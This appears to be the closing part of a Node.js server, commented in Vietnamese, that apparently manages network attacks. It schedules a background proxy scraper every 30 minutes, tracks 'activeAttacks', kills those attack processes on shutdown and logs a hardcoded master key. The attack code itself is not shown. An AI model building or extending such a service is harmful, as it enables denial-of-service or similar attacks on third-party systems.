  const runScraper = () => {
    console.log("[SYSTEM] Đang cập nhật proxy list (Background)...");
    const child = spawn("node", [proxyScript, "--silent"], {
      cwd: __dirname,
      detached: true,
      stdio: "ignore"
    });
    child.unref();
  };
  
  // Chạy ngay lập tức khi khởi động
  runScraper();
  
  // Chạy định kỳ mỗi 30 phút
  setInterval(runScraper, 30 * 60 * 1000);
}

// ==================== KHỞI ĐỘNG SERVER ====================

const server = app.listen(PORT, () => {
  console.log(`🚀 API Server đã khởi động trên port ${PORT}`);
  console.log(`📌 Truy cập: http://localhost:${PORT}`);
  console.log(`🔐 Master key: master_key`);
  console.log(`📊 Đã tải ${Object.keys(loadApiKeys()).length} API keys`);
  console.log(`🔄 Auto proxy scraper: Enabled (30 phút/lần)`);
  
  startProxyScraper();
});

// ==================== XỬ LÝ SHUTDOWN ====================

process.on("SIGINT", () => {
  console.log("\n🛑 Đang dừng tất cả cuộc tấn công...");
  
  for (const [id, attack] of activeAttacks) {
    if (attack.process && attack.process.pid) {
      try {
        process.kill(-attack.process.pid, "SIGINT");
      } catch (e) {
        // Ignore errors
      }
    }
  }
  
  console.log("👋 API Server đã dừng");
  server.close(() => {
    process.exit(0);
  });
});

// ==================== XỬ LÝ LỖI ====================

process.on("uncaughtException", (err) => {
  console.error("❌ Uncaught Exception:", err.message);
  console.error(err.stack);
});

process.on("unhandledRejection", (reason, promise) => {
  console.error("❌ Unhandled Rejection at:", promise, "reason:", reason);
});
